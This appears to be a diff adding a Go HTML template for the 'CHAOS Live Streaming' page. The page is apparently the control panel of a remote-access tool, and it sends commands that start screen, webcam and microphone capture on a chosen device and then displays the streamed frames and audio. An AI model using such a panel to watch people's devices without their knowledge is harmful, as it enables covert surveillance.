@@ -1,0 +1,224 @@
+{{ define "content" }}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CHAOS Live Streaming - {{.DeviceID}}</title>
+    <link rel="stylesheet" href="/static/css/bootstrap.css">
+    <link rel="stylesheet" href="/static/css/font_awesome.css">
+    <link rel="stylesheet" href="/static/css/main_custom.css">
+</head>
+<body>
+<div class="container">
+    <div class="row">
+        <div class="col-md-12 mx-auto">
+            <div class="card shadow card-body">
+                <h2 class="text-left mb-6">Live Streaming - Device {{.DeviceID}}</h2>
+                <hr>
+
+                <div class="row mb-4">
+                    <div class="col-md-3">
+                        <label for="fps">FPS:</label>
+                        <select id="fps" class="form-control">
+                            <option value="5">5 FPS</option>
+                            <option value="10" selected>10 FPS</option>
+                            <option value="15">15 FPS</option>
+                            <option value="30">30 FPS</option>
+                        </select>
+                    </div>
+                    <div class="col-md-3">
+                        <label for="quality">Quality:</label>
+                        <select id="quality" class="form-control">
+                            <option value="50">Low (50%)</option>
+                            <option value="80" selected>Good (80%)</option>
+                            <option value="100">Best (100%)</option>
+                        </select>
+                    </div>
+                    <div class="col-md-6">
+                        <label>Stream Controls:</label><br>
+                        <button id="startScreen" class="btn btn-primary">Start Screen</button>
+                        <button id="startWebcam" class="btn btn-success">Start Webcam</button>
+                        <button id="startMic" class="btn btn-warning">Start Microphone</button>
+                        <button id="stopAll" class="btn btn-danger">Stop All</button>
+                    </div>
+                </div>
+
+                <div class="row">
+                    <div class="col-md-8">
+                        <h4>Video Stream</h4>
+                        <div id="videoContainer" class="border p-2" style="min-height: 400px; background: #f8f9fa;">
+                            <img id="videoStream" class="img-fluid" style="max-width: 100%; display: none;" />
+                            <div id="videoPlaceholder" class="text-center text-muted">
+                                <i class="fas fa-video fa-3x mb-3"></i>
+                                <p>Click "Start Screen" or "Start Webcam" to begin streaming</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-4">
+                        <h4>Audio Stream</h4>
+                        <div id="audioContainer" class="border p-2" style="min-height: 200px; background: #f8f9fa;">
+                            <audio id="audioStream" controls style="width: 100%; display: none;"></audio>
+                            <div id="audioPlaceholder" class="text-center text-muted">
+                                <i class="fas fa-microphone fa-2x mb-2"></i>
+                                <p>Click "Start Microphone" to begin audio streaming</p>
+                            </div>
+                        </div>
+
+                        <h4 class="mt-4">Status</h4>
+                        <div id="status" class="alert alert-info">
+                            Ready to stream
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+let currentStreamType = null;
+let streamInterval = null;
+
+function handleStreamData(data) {
+    if (currentStreamType === 'screenstream' || currentStreamType === 'webcam') {
+        // data is base64 string from JSON
+        const binaryString = atob(data);
+        const bytes = new Uint8Array(binaryString.length);
+        for (let i = 0; i < binaryString.length; i++) {
+            bytes[i] = binaryString.charCodeAt(i);
+        }
+        const blob = new Blob([bytes], { type: 'image/jpeg' });
+        const url = URL.createObjectURL(blob);
+        const img = document.getElementById('videoStream');
+        img.src = url;
+        img.style.display = 'block';
+        document.getElementById('videoPlaceholder').style.display = 'none';
+
+        // Clean up old blob URLs to prevent memory leaks
+        setTimeout(() => URL.revokeObjectURL(url), 100);
+    } else if (currentStreamType === 'microphone') {
+        // data is base64 string from JSON
+        const binaryString = atob(data);
+        const bytes = new Uint8Array(binaryString.length);
+        for (let i = 0; i < binaryString.length; i++) {
+            bytes[i] = binaryString.charCodeAt(i);
+        }
+        const blob = new Blob([bytes], { type: 'audio/wav' });
+        const url = URL.createObjectURL(blob);
+        const audio = document.getElementById('audioStream');
+        audio.src = url;
+        audio.style.display = 'block';
+        document.getElementById('audioPlaceholder').style.display = 'none';
+        audio.play();
+    }
+}
+
+async function sendCommand(command, parameter = '') {
+    const deviceId = '{{.DeviceID}}';
+    try {
+        const response = await fetch('/command', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: new URLSearchParams({
+                address: deviceId,
+                command: command,
+                parameter: parameter
+            })
+        });
+        const result = await response.text();
+        console.log('[CMD] Response:', result);
+        return result;
+    } catch (error) {
+        console.error('[CMD] Error:', error);
+        return null;
+    }
+}
+
+async function startStream(type) {
+    currentStreamType = type;
+    const fps = document.getElementById('fps').value;
+    const quality = document.getElementById('quality').value;
+    const params = `fps=${fps} quality=${quality}`;
+
+    updateStatus(`Starting ${type}...`, 'info');
+    const result = await sendCommand(type, params);
+
+    if (result && result.includes('started')) {
+        updateStatus(`${type} streaming active`, 'success');
+
+        // Start polling for stream data
+        streamInterval = setInterval(async () => {
+            await fetchStreamData();
+        }, 200); // Poll every 200ms for smooth streaming
+    } else {
+        updateStatus(`Failed to start ${type}`, 'danger');
+    }
+}
+
+async function fetchStreamData() {
+    if (!currentStreamType) return;
+
+    const deviceId = '{{.DeviceID}}';
+    try {
+        const response = await fetch(`/stream/data/${deviceId}/${currentStreamType}`);
+        if (response.ok) {
+            const data = await response.arrayBuffer();
+            if (data.byteLength > 0) {
+                handleStreamData(btoa(String.fromCharCode(...new Uint8Array(data))));
+            }
+        }
+    } catch (error) {
+        // Ignore fetch errors during streaming
+    }
+}
+
+async function stopStream() {
+    if (currentStreamType) {
+        const type = currentStreamType;
+        currentStreamType = null;
+
+        if (streamInterval) {
+            clearInterval(streamInterval);
+            streamInterval = null;
+        }
+
+        updateStatus('Stopping stream...', 'warning');
+        await sendCommand('stop', type);
+        updateStatus('Stream stopped', 'info');
+
+        // Hide streams
+        document.getElementById('videoStream').style.display = 'none';
+        document.getElementById('videoPlaceholder').style.display = 'block';
+        document.getElementById('audioStream').style.display = 'none';
+        document.getElementById('audioPlaceholder').style.display = 'block';
+    }
+}
+
+function updateStatus(message, type) {
+    const status = document.getElementById('status');
+    status.className = `alert alert-${type}`;
+    status.textContent = message;
+}
+
+// Event listeners
+document.getElementById('startScreen').addEventListener('click', () => startStream('screenstream'));
+document.getElementById('startWebcam').addEventListener('click', () => startStream('webcam'));
+document.getElementById('startMic').addEventListener('click', () => startStream('microphone'));
+document.getElementById('stopAll').addEventListener('click', stopStream);
+
+// Initialize
+updateStatus('Ready to stream', 'info');
+</script>
+
+<script src="/static/js/jquery-3.5.1.js"></script>
+<script src="/static/js/popper.min.js"></script>
+<script src="/static/js/bootstrap.min.js"></script>
+<script src="/static/js/app/common.js"></script>
+<script src="/static/js/app/notify.js"></script>
+
+</body>
+</html>
+{{ end }}
